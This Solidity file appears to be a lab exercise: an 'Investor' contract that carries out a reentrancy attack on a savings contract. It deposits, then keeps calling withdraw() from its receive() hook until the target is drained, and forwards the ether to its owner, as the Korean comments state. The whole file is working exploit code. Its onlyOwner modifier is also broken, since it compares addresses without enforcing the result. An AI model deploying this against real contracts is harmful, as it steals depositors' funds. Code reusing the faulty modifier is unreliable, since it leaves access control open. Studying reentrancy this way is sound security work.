// SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

import "hardhat/console.sol";

interface ISavingsAccount {
    function deposit() external payable;
    function withdraw() external;
}

contract Investor {
    ISavingsAccount public immutable savingsAccount;
    address private owner;

    constructor(address savingsAccountContractAddress) {
        owner = msg.sender;
        savingsAccount = ISavingsAccount(savingsAccountContractAddress);
    }

    modifier onlyOwner() {
        msg.sender == owner;
        _;
    }

    function attack()
    external payable 
    onlyOwner 
    {
        savingsAccount.deposit{ value : msg.value }();
        savingsAccount.withdraw();
    }
    // 이더 수신 시 작동;
    receive() external payable {
        console.log("=== Re-Entring receive Function ===");
        console.log(address(this).balance);
        console.log(address(savingsAccount).balance);
        if(address(savingsAccount).balance > 0) {

            savingsAccount.withdraw();
        } else {
            // 다 털었으면 현재 컨트렉트의 잔고를 owner에게 전송하시오.
            payable(owner).transfer(address(this).balance);
        }
    }
}